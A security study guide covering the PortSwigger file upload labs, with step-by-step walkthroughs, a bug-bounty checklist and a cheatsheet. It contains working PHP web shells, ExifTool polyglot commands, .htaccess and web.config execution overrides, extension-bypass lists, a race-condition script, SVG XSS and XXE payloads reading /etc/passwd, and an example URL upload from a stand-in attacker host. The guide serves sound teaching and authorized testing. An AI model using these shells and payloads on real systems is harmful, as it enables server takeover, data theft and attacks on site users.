# File Upload Vulnerabilities — Complete PortSwigger Guide
### zerach | Bug Bounty & Pentest Reference | 2025–2026

> **Covers every topic and all labs** in the PortSwigger Web Security Academy File Upload learning path. Use this as your lab companion, theory reference, and real-world hunting cheatsheet.

---

## Table of Contents

1. [What Are File Upload Vulnerabilities?](#1-what-are-file-upload-vulnerabilities)
2. [Impact: What Can Go Wrong?](#2-impact-what-can-go-wrong)
3. [How Do They Arise?](#3-how-do-they-arise)
4. [How Web Servers Handle Static Files](#4-how-web-servers-handle-static-files)
5. [Exploiting Unrestricted File Uploads — Web Shell](#5-exploiting-unrestricted-file-uploads--web-shell)
   - [LAB 1: Remote code execution via web shell upload (Apprentice)](#lab-1-remote-code-execution-via-web-shell-upload)
6. [Exploiting Flawed Validation](#6-exploiting-flawed-validation)
   - [Flawed Content-Type Validation](#61-flawed-content-type-validation)
   - [LAB 2: Web shell upload via Content-Type restriction bypass (Apprentice)](#lab-2-web-shell-upload-via-content-type-restriction-bypass)
7. [Preventing Execution in User-Accessible Directories](#7-preventing-execution-in-user-accessible-directories)
   - [LAB 3: Web shell upload via path traversal (Practitioner)](#lab-3-web-shell-upload-via-path-traversal)
8. [Insufficient Blacklisting of Dangerous File Types](#8-insufficient-blacklisting-of-dangerous-file-types)
   - [Overriding Server Configuration (.htaccess)](#81-overriding-server-configuration-htaccess)
   - [LAB 4: Web shell upload via extension blacklist bypass (Practitioner)](#lab-4-web-shell-upload-via-extension-blacklist-bypass)
   - [Obfuscating File Extensions](#82-obfuscating-file-extensions)
   - [LAB 5: Web shell upload via obfuscated file extension (Practitioner)](#lab-5-web-shell-upload-via-obfuscated-file-extension)
9. [Flawed Validation of File Contents (Magic Bytes)](#9-flawed-validation-of-file-contents-magic-bytes)
   - [LAB 6: Remote code execution via polyglot web shell upload (Practitioner)](#lab-6-remote-code-execution-via-polyglot-web-shell-upload)
10. [Exploiting File Upload Race Conditions](#10-exploiting-file-upload-race-conditions)
    - [URL-Based File Uploads](#101-race-conditions-in-url-based-uploads)
11. [Exploiting Without Remote Code Execution](#11-exploiting-without-remote-code-execution)
    - [Uploading Malicious Client-Side Scripts](#111-uploading-malicious-client-side-scripts)
    - [Exploiting Parsing Vulnerabilities](#112-exploiting-vulnerabilities-in-parsing)
12. [Uploading Files Using PUT](#12-uploading-files-using-put)
13. [How to Prevent File Upload Vulnerabilities](#13-how-to-prevent-file-upload-vulnerabilities)
14. [Bug Bounty Hunting Checklist](#14-bug-bounty-hunting-checklist)
15. [Quick Reference Cheatsheet](#15-quick-reference-cheatsheet)

---

## 1. What Are File Upload Vulnerabilities?

File upload vulnerabilities occur when a web server lets users upload files **without properly validating**:
- The file's **name**
- The file's **type / MIME type**
- The file's **contents**
- The file's **size**

Even something as innocent as a profile picture upload can become a critical attack vector if the server trusts the user's input.

### Simple Mental Model

```
User uploads file → Server saves it → Server (or browser) executes it
                                              ^
                               If YOU control this step → RCE / XSS / etc.
```

### Why This Is Critical for Bug Bounty

File upload bugs regularly land as **Critical / High** severity:
- Unrestricted PHP shell → Remote Code Execution (RCE) → full server takeover
- Stored XSS via SVG or HTML upload → session hijack
- Path traversal in filename → overwrite server files
- XXE via XML/SVG uploads → SSRF or data exfiltration

---

## 2. Impact: What Can Go Wrong?

The impact depends on two factors:
1. **What the server fails to validate** (name, type, content, size)
2. **What the server does with the file** (executes it? serves it? parses it?)

| Scenario | Impact |
|----------|--------|
| PHP web shell uploaded and executed | Full RCE — attacker runs OS commands |
| HTML/SVG with JS uploaded, served back | Stored XSS — steal session cookies |
| Filename not sanitized (e.g., `../../../etc/passwd`) | Path traversal — overwrite critical files |
| File size not limited | Denial of Service (DoS) — fill disk |
| XML/SVG parsed server-side | XXE → SSRF, file disclosure |
| Malicious archive (zip slip) | Extract to arbitrary path |

> **Key insight:** The most severe impact comes when the uploaded file is *executed* by the server, not just stored.

---

## 3. How Do They Arise?

Developers typically add **filters** but make one of these mistakes:

| Mistake | Example |
|---------|---------|
| Blacklist-only approach | Block `.php` but forget `.php5`, `.phtml`, `.phar` |
| Check only the Content-Type header | Attacker changes header to `image/jpeg` while uploading PHP |
| Check only the file extension | Attacker adds null byte: `shell.php%00.jpg` |
| Check magic bytes but still execute | Polyglot file — valid JPEG header + PHP payload |
| Validate on upload but not on move | Race condition window between save and check |
| Store files in a web-accessible dir with execution enabled | Files served AND executed by the server |

---

## 4. How Web Servers Handle Static Files

Understanding this is essential — it explains **why** execution happens.

### The MIME Type Mapping

When a request comes in for a file, the server:
1. Reads the file extension (e.g., `.php`)
2. Looks it up in its MIME type mapping (e.g., `application/x-httpd-php`)
3. Decides what to do:
   - **Executable MIME** → pass to interpreter (PHP, Python, etc.)
   - **Renderable MIME** → send to browser as-is (HTML, images)
   - **Unknown MIME** → typically serve as download with `Content-Type: application/octet-stream`

### Apache vs Nginx

```
Apache (mod_php):
  .php → PHP interpreter → Execute the file

Nginx + PHP-FPM:
  .php → Forward to PHP-FPM socket → Execute the file

If .php is NOT in the MIME map:
  → Serve as plain text (safer, but not always the case)
```

### What This Means for Attackers

If you can upload a `.php` file to a **web-accessible directory** on an Apache server:
→ Requesting that file via browser triggers PHP execution
→ Your PHP code runs on the server

This is the core primitive of almost every file upload exploit.

---

## 5. Exploiting Unrestricted File Uploads — Web Shell

The simplest case: the server performs **zero validation**. Upload anything, execute anything.

### The PHP Web Shell

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

For interactive command execution:
```php
<?php echo system($_GET['cmd']); ?>
```
Then visit: `https://victim.com/uploads/shell.php?cmd=id`

### How It Works

```
1. POST /upload with filename=shell.php, content=<?php system($_GET['cmd']); ?>
2. Server saves file to /var/www/html/uploads/shell.php
3. GET /uploads/shell.php?cmd=whoami
4. Server executes PHP → returns "www-data"
```

---

### LAB 1: Remote code execution via web shell upload

**Difficulty:** Apprentice  
**Goal:** Upload a PHP web shell, read `/home/carlos/secret`

**Step-by-step:**

1. **Login** with credentials `wiener:peter`

2. **Navigate to your profile** — find the avatar/file upload field

3. **Upload a real image first** to observe the upload flow
   - Open Burp Proxy → Intercept OFF
   - Upload any `.jpg` image
   - In **Proxy → HTTP History**, find the `GET /files/avatars/<your-image>` request
   - Note the URL pattern: `/files/avatars/` is the upload directory

4. **Create your web shell locally:**
   ```
   File: exploit.php
   Content: <?php echo file_get_contents('/home/carlos/secret'); ?>
   ```

5. **Upload exploit.php** via the avatar upload field
   - The server has no validation → it accepts it directly

6. **Trigger execution** by visiting the uploaded file:
   - In Burp, find the image GET request and send to **Repeater**
   - Change the filename in the path to `exploit.php`
   - Send → the PHP executes → response contains the secret

7. **Submit the secret** using the lab's Submit button

**What you learned:** With zero validation, any file is accepted and executed.

---

## 6. Exploiting Flawed Validation

Most real servers do *some* validation. Here's how to bypass the most common kinds.

### 6.1 Flawed Content-Type Validation

The server might check the `Content-Type` header in the multipart request. The problem: **this header is fully controlled by the client**.

**Normal image upload request:**
```http
POST /my-account/avatar HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="photo.jpg"
Content-Type: image/jpeg

[binary image data]
------WebKitFormBoundary--
```

**Bypass — keep PHP content but lie about Content-Type:**
```http
------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg              ← Lie: pretend it's a JPEG

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary--
```

The server checks `Content-Type: image/jpeg` → passes. But the file extension is `.php` and the content is PHP → it gets executed.

---

### LAB 2: Web shell upload via Content-Type restriction bypass

**Difficulty:** Apprentice  
**Goal:** Bypass Content-Type check, execute PHP web shell

**Step-by-step:**

1. **Login** as `wiener:peter`

2. **Upload a real image** first — observe it works normally

3. **Try uploading exploit.php directly** — you'll get an error like:
   > "Sorry, file type application/x-php is not allowed"

4. **Intercept the upload request in Burp:**
   - Enable Intercept (Proxy → Intercept ON)
   - Try uploading `exploit.php` again
   - When Burp catches the request, look for the line:
     ```
     Content-Type: application/x-php
     ```

5. **Modify the Content-Type:**
   - Change `application/x-php` → `image/jpeg`
   - Keep the filename as `exploit.php`
   - Keep the PHP content unchanged
   - Forward the request

6. **Confirm upload success** — should say "avatar uploaded successfully"

7. **Trigger execution:**
   - Find the GET request for your avatar image
   - Replace the filename with `exploit.php`
   - Send → read the secret in the response

8. **Submit the secret**

**Burp Repeater tip:** After step 5, switch off intercept and use Repeater to quickly iterate.

---

## 7. Preventing Execution in User-Accessible Directories

A smarter defense: allow file uploads but **configure the upload directory to not execute scripts**. Apache/Nginx can be set so PHP files in `/uploads/` are served as plain text, never executed.

### The Bypass: Path Traversal in Filename

If the server doesn't sanitize the **filename** parameter, you can escape the no-execute directory:

```
filename="../exploit.php"
```

This causes the file to be saved one directory up — potentially in a location where PHP *is* executed.

**URL-encoded versions** (try all if the server decodes):
```
filename="..%2Fexploit.php"
filename="..%252Fexploit.php"   ← double URL-encoded
filename="%2e%2e%2fexploit.php"
```

---

### LAB 3: Web shell upload via path traversal

**Difficulty:** Practitioner  
**Goal:** Bypass execution restriction by uploading to a parent directory

**Step-by-step:**

1. **Login** as `wiener:peter`

2. **Upload a real image first** — in Proxy History, note the avatar fetched via:
   `GET /files/avatars/<image>`

3. **Try uploading exploit.php normally:**
   - Upload succeeds (no content-type check)
   - But when you GET `/files/avatars/exploit.php`, you see the raw PHP — **not executed** (server blocks execution in `/avatars/`)

4. **Intercept the upload request** in Burp — send to **Repeater**

5. **Modify the filename parameter** to traverse up a directory:
   ```
   filename="../exploit.php"
   ```

6. **Send the request** — observe the response:
   - If it says "The file avatars/../exploit.php has been uploaded" → the server accepted the traversal
   - This means the file was saved to `/files/exploit.php` (one level up)

7. **Trigger execution:**
   - In Burp Repeater, modify the GET request:
     Change `/files/avatars/<image>` to `/files/exploit.php`
   - Or try the URL-encoded version:
     `/files/avatars/..%2Fexploit.php`
   - Send → PHP executes → you get the secret

8. **If direct `../` is stripped**, try URL-encoding:
   - `..%2Fexploit.php` → server decodes, traverses directory
   - `..%252Fexploit.php` → double encoded (if server double-decodes)

9. **Submit the secret**

---

## 8. Insufficient Blacklisting of Dangerous File Types

Blacklists are inherently flawed — you can never block everything.

### Common Bypasses for PHP Blacklists

| Blocked | Try Instead |
|---------|-------------|
| `.php` | `.php5`, `.php7`, `.phtml`, `.phar`, `.phps` |
| `.php` (case-sensitive) | `.PHP`, `.PhP`, `.pHp` |
| `.php` | `.php.` (trailing dot) |
| `.php` | `exploit.php.jpg` (double extension) |
| `.php` | `exploit.php%00.jpg` (null byte, older systems) |
| `.php` | `exploit.php::$DATA` (Windows NTFS stream) |

---

### 8.1 Overriding Server Configuration (.htaccess)

Apache allows per-directory configuration via a file named `.htaccess`. If you can upload this file, you can **redefine which extensions get executed as PHP**.

**The .htaccess payload:**
```
AddType application/x-httpd-php .l33t
```

This tells Apache: "treat any file with the `.l33t` extension as PHP and execute it."

**Attack flow:**
1. Upload `.htaccess` with the `AddType` directive → establishes the new rule in `/avatars/`
2. Upload `exploit.l33t` containing PHP code → `.l33t` now executes as PHP

This bypasses any blacklist that blocks `.php` but not custom extensions.

---

### LAB 4: Web shell upload via extension blacklist bypass

**Difficulty:** Practitioner  
**Goal:** Upload `.htaccess` to allow custom extension, then execute a web shell

**Step-by-step:**

1. **Login** as `wiener:peter`

2. **Upload a real image** — note the upload request in Burp Proxy History

3. **Try uploading exploit.php** — blocked: "Sorry, PHP files are not allowed"

4. **Send the upload request to Repeater**

5. **First request — upload the .htaccess file:**
   In Repeater, modify the request:
   ```
   filename=".htaccess"                    ← Change filename
   Content-Type: text/plain               ← Change content type
   
   [body — replace image data with:]
   AddType application/x-httpd-php .l33t
   ```
   Send → should get "File uploaded successfully"

6. **Second request — upload your PHP web shell with .l33t extension:**
   In Repeater, modify:
   ```
   filename="exploit.l33t"                ← .l33t extension
   Content-Type: image/png               ← Pretend it's an image
   
   [body:]
   <?php echo file_get_contents('/home/carlos/secret'); ?>
   ```
   Send → "File uploaded successfully"

7. **Trigger execution:**
   - Find the GET request for your avatar → send to Repeater
   - Change path from `/files/avatars/<image>` to `/files/avatars/exploit.l33t`
   - Send → PHP executes (`.l33t` is now mapped to PHP interpreter)
   - Response contains Carlos's secret

8. **Submit the secret**

**Why this works:** The `.htaccess` you uploaded affected only the `/avatars/` directory. Apache then executes `.l33t` files as PHP within that directory.

---

### 8.2 Obfuscating File Extensions

Developers often strip or check extensions, but parsers can be tricked.

**Technique 1: URL encoding**
```
exploit%2Ephp     → becomes exploit.php after decoding
```

**Technique 2: Null byte injection (older systems)**
```
exploit.php%00.jpg
```
The server extension check sees `.jpg` (stops at the null byte). The PHP interpreter ignores everything after `\0` and executes `exploit.php`.

**Technique 3: Trailing dot or space**
```
exploit.php.
exploit.php%20
```
Windows file system strips trailing dots and spaces.

**Technique 4: Double extension**
```
exploit.php.jpg
```
Some Apache configs may execute `.php.jpg` if `mod_php` is configured to handle any file containing `.php`.

**Technique 5: Case variation**
```
exploit.PHP
exploit.PhP
```
Case-insensitive file systems (Windows) may execute `.PHP` the same as `.php`.

---

### LAB 5: Web shell upload via obfuscated file extension

**Difficulty:** Practitioner  
**Goal:** Bypass extension blacklist using obfuscation technique

**Step-by-step:**

1. **Login** as `wiener:peter`

2. **Upload a real image** and observe the normal flow

3. **Try uploading exploit.php** → blocked: "Sorry, only JPG & PNG files are allowed"

4. **Intercept the upload request in Burp** — send to Repeater

5. **Try obfuscation techniques one by one** until one succeeds:
   
   **Option A — Null byte (try this first):**
   ```
   filename="exploit.php%00.jpg"
   ```
   The validation sees `.jpg` → allowed. But PHP sees `exploit.php` (null byte terminates the string).

   **Option B — Trailing dot:**
   ```
   filename="exploit.php."
   ```

   **Option C — URL-encoded dot:**
   ```
   filename="exploit%2Ephp"
   ```

6. **Send each attempt** and check the response. A success response will say the file was uploaded.

7. **Trigger execution:**
   - Modify the GET avatar request in Repeater
   - Try `/files/avatars/exploit.php` (null byte stripped, filename saved as `exploit.php`)
   - Send → PHP executes → secret revealed

8. **Submit the secret**

**Burp Intruder shortcut:** Use Intruder with a wordlist of extension variations (`.php`, `.php5`, `.phtml`, `.phar`, `.PHP`, `.php.jpg`, `.php%00.jpg`, `.php.`) to quickly find what the server accepts.

---

## 9. Flawed Validation of File Contents (Magic Bytes)

Some servers don't trust the filename or Content-Type — instead, they **check the actual bytes** at the start of the file (called "magic bytes" or "file signature").

### Common Magic Bytes

| File Type | Magic Bytes (hex) | ASCII |
|-----------|-------------------|-------|
| JPEG | `FF D8 FF` | `ÿØÿ` |
| PNG | `89 50 4E 47` | `‰PNG` |
| GIF | `47 49 46 38` | `GIF8` |
| PDF | `25 50 44 46` | `%PDF` |
| ZIP | `50 4B 03 04` | `PK` |

**The bypass: Polyglot files**

A polyglot file is valid as *two* file types simultaneously — it satisfies magic byte checks while containing a malicious payload.

### Creating a PHP/JPEG Polyglot with ExifTool

ExifTool lets you embed arbitrary metadata into image files. PHP code embedded in a JPEG's `Comment` field will execute if the file is saved as `.php`:

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" \
  legitimate_image.jpg -o polyglot.php
```

**What this produces:**
- A valid JPEG (passes magic byte check: starts with `FF D8 FF`)
- Contains PHP payload in the EXIF Comment field
- Saved with `.php` extension → server executes the PHP interpreter on it
- PHP ignores binary JPEG data, finds the PHP tags, executes the code

---

### LAB 6: Remote code execution via polyglot web shell upload

**Difficulty:** Practitioner  
**Goal:** Bypass content validation using a polyglot PHP/JPEG file

**Prerequisites:** Install ExifTool (`brew install exiftool` / `apt install libimage-exiftool-perl`)

**Step-by-step:**

1. **Login** as `wiener:peter`

2. **Download any JPEG image** to use as your base file (or use your existing avatar)

3. **Create the polyglot file using ExifTool:**
   ```bash
   exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" \
     your_image.jpg -o polyglot.php
   ```
   This creates `polyglot.php` — a valid JPEG with PHP code in the EXIF Comment.

4. **Upload polyglot.php** via the avatar upload:
   - The server reads the first bytes → `FF D8 FF` → thinks it's a JPEG → passes validation
   - But the filename is `.php` → saved and later executed as PHP

5. **Trigger execution:**
   - In Burp Proxy History, find the GET request for your avatar
   - Change the filename to `polyglot.php`
   - Send → PHP executes

6. **Find the secret in the response:**
   - The response will contain binary JPEG data mixed with text
   - Use Burp's **Search** feature to find the string `START`
   - The secret appears between `START` and `END`

7. **Submit the secret**

**Alternative without ExifTool:**
You can prepend JPEG magic bytes manually in Burp Repeater:
```
[FF D8 FF body of existing JPEG]
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
Some validators only check the first few bytes, so this can work too.

---

## 10. Exploiting File Upload Race Conditions

Some servers implement a "validate-then-delete" pattern:

```
1. File is uploaded and temporarily saved
2. Server runs validation (AV scan, file type check)
3. If valid → move to permanent location
4. If invalid → delete the file
```

**The race condition:** Between steps 1 and 3, the file exists on disk. If you can request it before it's deleted, you can get it executed.

### The Exploit Flow

```
Thread A: POST /upload (uploads exploit.php)
Thread B: GET /uploads/exploit.php  ← fires immediately during Thread A's execution
                ^
         Hit the file before validation runs and deletes it
```

This requires **timing precision** — use Burp's Turbo Intruder or a script to fire the GET request repeatedly during the upload.

### The Vulnerable Code Pattern

```php
// Upload PHP code that causes the race:
<?php echo file_get_contents('/home/carlos/secret'); ?>

// Server-side vulnerable code:
move_uploaded_file($tmp, $target);   // ← File exists here!
if (checkViruses($target) && checkFileType($target)) {
    // valid
} else {
    unlink($target);                 // ← Deleted here
}
```

Window = time between `move_uploaded_file` and `unlink` — might be milliseconds.

### Burp Turbo Intruder Script

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           engine=Engine.THREADED)

    # Upload the shell
    engine.queue(target.req, gate='race1')

    # Immediately try to fetch it multiple times
    for i in range(5):
        engine.queue('''GET /files/avatars/exploit.php HTTP/1.1
Host: TARGET.web-security-academy.net
Cookie: session=YOUR_SESSION

''', gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

---

### 10.1 Race Conditions in URL-Based Uploads

Some servers allow uploading files by providing a **URL** — the server fetches the file itself:

```
POST /upload
body: url=https://attacker.com/exploit.php
```

**The race:** The server fetches the URL, saves the file temporarily, validates, then either keeps or deletes it. During validation, the file exists on disk.

**The exploit:** Point the URL to your server, include your PHP payload. The fetch triggers a brief window where the file exists and can be executed.

**Additional consideration:** If the server uses an allowlist of URLs (e.g., only `https://storage.example.com`), look for **SSRF bypasses** in the URL parameter — this is a separate but related attack surface.

---

## 11. Exploiting Without Remote Code Execution

Even without executing server-side code, file uploads can still be dangerous.

### 11.1 Uploading Malicious Client-Side Scripts

**SVG files** are XML-based images that can contain JavaScript. If the server allows SVG uploads and serves them back, you have **Stored XSS**:

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);"/>
   <script type="text/javascript">
      alert(document.cookie)
   </script>
</svg>
```

**HTML files** work the same way — upload an HTML file, get Stored XSS.

**Impact:** Steal session cookies, perform CSRF, redirect users, capture credentials.

**When to look for this:** Profile picture uploads, file sharing platforms, content management systems, comment/attachment features.

### 11.2 Exploiting Vulnerabilities in Parsing

Servers that **parse** file contents can be attacked even without code execution:

**XXE via SVG:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```
If the server parses the SVG to generate a thumbnail, the XXE may fire — leaking local files or triggering SSRF.

**XXE via Office Documents:**
`.docx`, `.xlsx`, and `.odt` files are ZIP archives containing XML. If the server processes them (e.g., preview generation), embedded XXE entities may fire.

**Zip Slip:**
Some servers extract ZIP archives server-side. Crafted archive filenames like `../../etc/cron.d/backdoor` can write files to arbitrary locations:
```
Tools: evilzip, zip-slip-poc generators
```

---

## 12. Uploading Files Using PUT

Some servers have HTTP `PUT` enabled. This allows direct file uploads without a form:

```http
PUT /upload/exploit.php HTTP/1.1
Host: victim.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

**How to discover this:**
1. Try `OPTIONS /` — look for `PUT` in the `Allow` response header
2. Try `PUT` on directories that serve files (`/uploads/`, `/static/`, `/files/`)

**Burp tip:** Use **Burp Scanner** or manually send `OPTIONS` requests to test for PUT availability on upload-adjacent paths.

---

## 13. How to Prevent File Upload Vulnerabilities

Understanding defenses helps both pentesters and defenders.

### Defense Checklist

| Defense | Implementation |
|---------|----------------|
| **Whitelist extensions** | Allow only `.jpg`, `.png`, `.gif`, `.pdf` — not a blacklist |
| **Validate MIME type server-side** | Check magic bytes using a library, not user-supplied Content-Type |
| **Rename files on upload** | Generate random UUID filename — prevents path traversal and extension attacks |
| **Store outside webroot** | `/var/uploads/` instead of `/var/www/html/uploads/` — can't be requested directly |
| **Disable execution in upload dir** | Apache: `Options -ExecCGI`, `php_flag engine off` in upload directory |
| **Use a separate domain** | Serve user content from `uploads.cdn.example.com` — limits XSS impact |
| **Validate file contents** | Use dedicated libraries (e.g., Python Pillow re-encodes images, stripping metadata) |
| **Limit file size** | Prevent DoS |
| **Virus/malware scanning** | AV scan before finalizing |
| **Content-Disposition header** | `Content-Disposition: attachment` forces download, prevents execution in browser |
| **CSP** | `Content-Security-Policy: default-src 'self'` limits damage from XSS via uploads |

### The Gold Standard Pattern

```
User uploads file
→ Receive as binary stream
→ Validate magic bytes with server library
→ Re-encode image (strips all metadata / polyglot content)
→ Rename to random UUID + whitelisted extension
→ Store at /var/uploads/UUID.jpg (outside webroot)
→ Serve via /files/UUID.jpg that reads from disk — never executes
```

---

## 14. Bug Bounty Hunting Checklist

Use this when you find a file upload feature in the wild.

### Recon

- [ ] What file types does it accept normally? (try multiple)
- [ ] What does the response look like after upload? (URL returned?)
- [ ] Is the upload directory directly accessible?
- [ ] Can you predict the uploaded filename/path?
- [ ] What server is running? (check `Server:` header — Apache, Nginx, IIS?)
- [ ] What language runs the app? (PHP, ASP.NET, Python, Node?)

### Test Sequence (Escalate from Low to High)

1. **Try uploading `.php` directly** — error tells you what validation exists
2. **Change Content-Type to `image/jpeg`** — bypass MIME check
3. **Try alternative PHP extensions:** `.php5`, `.phtml`, `.phar`, `.php7`
4. **Try extension obfuscation:** `exploit.php.`, `exploit.php%00.jpg`, `exploit.PHP`
5. **Upload `.htaccess`** (Apache) or `web.config` (IIS) to override execution rules
6. **Check magic bytes validation** — try polyglot (exiftool)
7. **Try path traversal in filename:** `../exploit.php`
8. **Try SVG with `<script>` tags** for XSS
9. **Try SVG/XML with XXE payload**
10. **Test PUT method** on upload paths
11. **Look for race condition** — upload and immediately fetch in parallel

### IIS-Specific (ASP.NET Apps)

For IIS targets, `web.config` is the equivalent of `.htaccess`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule"
              scriptProcessor="%windir%\system32\inetsrv\asp.dll"
              resourceType="Unspecified" requireAccess="Write" preCondition="bitness64"/>
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions><remove fileExtension=".config"/></fileExtensions>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%@ Language=VBScript %>
<% Response.Write("RCE via web.config") %>
```

---

## 15. Quick Reference Cheatsheet

### PHP Web Shells

```php
# Read file
<?php echo file_get_contents('/home/carlos/secret'); ?>

# Execute command (parameter-based)
<?php echo system($_GET['cmd']); ?>
# Usage: /uploads/shell.php?cmd=id

# Execute command (short tag)
<?= system($_GET['cmd']); ?>

# More resilient shell
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; } ?>
```

### ExifTool Polyglot

```bash
# Embed PHP in JPEG EXIF comment
exiftool -Comment="<?php echo system(\$_GET['cmd']); ?>" image.jpg -o shell.php

# With markers for easy extraction
exiftool -Comment="<?php echo 'START' . file_get_contents('/home/carlos/secret') . 'END'; ?>" image.jpg -o polyglot.php
```

### .htaccess Payloads

```apache
# Make .l33t execute as PHP
AddType application/x-httpd-php .l33t

# Make .shell execute as PHP  
AddType application/x-httpd-php .shell

# Make ALL files execute as PHP (nuclear option)
SetHandler application/x-httpd-php
```

### Extension Obfuscation List

```
exploit.php
exploit.php5
exploit.php7
exploit.phtml
exploit.phar
exploit.phps
exploit.pht
exploit.php.
exploit.PHP
exploit.PhP
exploit.php%00.jpg
exploit.php%0a.jpg
exploit.php::$DATA        (Windows NTFS)
exploit.php....           (Windows)
exploit%2Ephp
exploit.php%20
```

### Content-Type Values to Try

```
image/jpeg
image/png
image/gif
image/svg+xml
text/plain
application/octet-stream
```

### Quick Magic Bytes (Hex)

```
JPEG: FF D8 FF E0
PNG:  89 50 4E 47 0D 0A 1A 0A
GIF:  47 49 46 38 39 61  (GIF89a)
PDF:  25 50 44 46 2D      (%PDF-)
```

To prepend magic bytes to a PHP file in Burp Repeater, paste the following at the start of your payload field:
```
GIF89a;
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
(GIF magic bytes as ASCII, followed by PHP — simpler than binary for quick tests)

### Labs Summary

| # | Lab Name | Difficulty | Key Technique |
|---|----------|------------|---------------|
| 1 | Remote code execution via web shell upload | Apprentice | No validation — direct upload |
| 2 | Web shell upload via Content-Type restriction bypass | Apprentice | Change Content-Type header |
| 3 | Web shell upload via path traversal | Practitioner | `../` in filename parameter |
| 4 | Web shell upload via extension blacklist bypass | Practitioner | `.htaccess` + custom extension |
| 5 | Web shell upload via obfuscated file extension | Practitioner | Null byte / trailing dot |
| 6 | Remote code execution via polyglot web shell upload | Practitioner | ExifTool JPEG+PHP polyglot |
| 7 | Web shell upload via race condition | Expert | Race between upload and validation |

---

## Final Notes for Bug Bounty Hunting

**Always escalate methodically.** Don't jump to polyglots before testing basic Content-Type bypass — simpler bugs get reported too.

**Document every step.** Screenshot the upload request in Burp, the success response, and the triggered output. A good PoC shows the full chain.

**Check the execution context.** Even if you upload PHP, execution only happens if:
1. The file is in a web-accessible directory
2. The directory allows PHP execution
3. You can predict the URL to request it

**For report writing:**
- Severity: RCE via file upload = **Critical**
- XSS via SVG upload = **High** (or Medium if no stored XSS, just self-XSS)
- Path traversal without execution = **High**
- DoS via oversized upload = **Low-Medium**

**Credentials for PortSwigger Labs:** `wiener:peter` (all labs)

---

*Guide compiled from PortSwigger Web Security Academy File Upload learning path. Last updated: 2026. For personal use, study, and authorized security testing only.*
